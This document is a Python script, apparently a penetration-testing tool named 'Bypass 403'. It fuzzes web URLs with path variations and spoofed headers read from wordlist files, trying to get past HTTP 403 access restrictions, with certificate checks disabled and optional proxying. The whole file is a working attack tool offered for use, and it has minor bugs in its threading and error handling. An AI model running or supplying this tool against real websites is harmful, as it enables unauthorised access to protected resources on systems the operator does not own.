import requests
import argparse
import urllib3
import urllib
import threading
import re
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


banner = f"""{bcolors.OKCYAN}
	/$$$$$$$                                                   /$$   /$$  /$$$$$$   /$$$$$$ 
	| $$__  $$                                                 | $$  | $$ /$$$_  $$ /$$__  $$
	| $$  \ $$ /$$   /$$  /$$$$$$   /$$$$$$   /$$$$$$$ /$$$$$$$| $$  | $$| $$$$\ $$|__/  \ $$
	| $$$$$$$ | $$  | $$ /$$__  $$ |____  $$ /$$_____//$$_____/| $$$$$$$$| $$ $$ $$   /$$$$$/
	| $$__  $$| $$  | $$| $$  \ $$  /$$$$$$$|  $$$$$$|  $$$$$$ |_____  $$| $$\ $$$$  |___  $$
	| $$  \ $$| $$  | $$| $$  | $$ /$$__  $$ \____  $$\____  $$      | $$| $$ \ $$$ /$$  \ $$
	| $$$$$$$/|  $$$$$$$| $$$$$$$/|  $$$$$$$ /$$$$$$$//$$$$$$$/      | $$|  $$$$$$/|  $$$$$$/
	|_______/  \____  $$| $$____/  \_______/|_______/|_______/       |__/ \______/  \______/ 
		/$$  | $$| $$                                                                 
		|  $$$$$$/| $$                                                                 
		\______/ |__/                                                                 
					Bypass 403 Access Is Denied

😍 {bcolors.WARNING}Made with <3 By ITPAT{bcolors.OKCYAN}
-------------------------------------------------------------------------------{bcolors.ENDC}
 {bcolors.WARNING}Twitter ❯ https://twitter.com/IttipatJitrada{bcolors.OKCYAN}
-------------------------------------------------------------------------------
{bcolors.ENDC}"""
print(banner)

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", type=str,
                    help="URL status 403 that you want to bypass", required=True)
parser.add_argument("-l", "--list", type=argparse.FileType('r'),
                    help="List of URL status 403 that you want to bypass", required=False)
parser.add_argument('-p', '--proxy', type=str,
                    help='Burp proxy or any other proxy to send the request \n \t -p http://127.0.0.1:9090', default="no-proxy")
args = parser.parse_args()


# Read payload file

with open("./Wordlists/Header_bypass403.txt") as HeaderBypass:
    Header = HeaderBypass.read().split("\n")

with open("./Wordlists/URL_bypass403.txt") as URLBypass:
    URL = URLBypass.read().split("\n")


def Bypass403(url403):
    try:
        req = requests.session()

        for urlbypass in URL:
            Bypass403_URL = url403 + urlbypass
            res = req.get(Bypass403_URL, verify=False)
            if res.status_code == 200:
                print(f"URL : [", Bypass403_URL, "] Bypass !!! ")
            else:
                print(f"URL : [", Bypass403_URL, "] Can't Bypass T_T ")

        print("-------------------------------------------------------------------------------")
        print("Begin Bypass with Header")
        print("-------------------------------------------------------------------------------")

        for headerbypass in Header:
            splitHeader = headerbypass.split(":")
            removeSpace = splitHeader[1].strip()
            setHeader = {f"{splitHeader[0]}": f"{removeSpace}"}
            burp_proxy = {"http": args.proxy, "https": args.proxy}
            # Check has proxy
            if args.proxy != "no-proxy":
                res = req.get(url403, headers=setHeader,
                              verify=False, proxies=burp_proxy)
            else:
                res = req.get(url403, headers=setHeader, verify=False)
            # Check Status Code
            if res.status_code == 200 or res.status_code == 301 or res.status_code == 302:
                print(f"URL : [", url403, "] With Header : [",
                      setHeader, "] : Bypass \o/ ")
            else:
                print(f"URL : [", url403, "] With Header : [",
                      setHeader, "] : Can't Bypass T_T ")
    except KeyboardInterrupt:
        exit(0)
    except:
        print(f"URL : [", Bypass403_URL, "] Error -_- ")


def fuzz_Request(url):
    thread = threading.Thread(target=Bypass403(url))
    thread.start()


if args.list != None:
    readFile = args.list.read()
    listSplit = readFile.split('\n')
    for url in listSplit:
        fuzz_Request(url)
else:
    Bypass403(args.url)
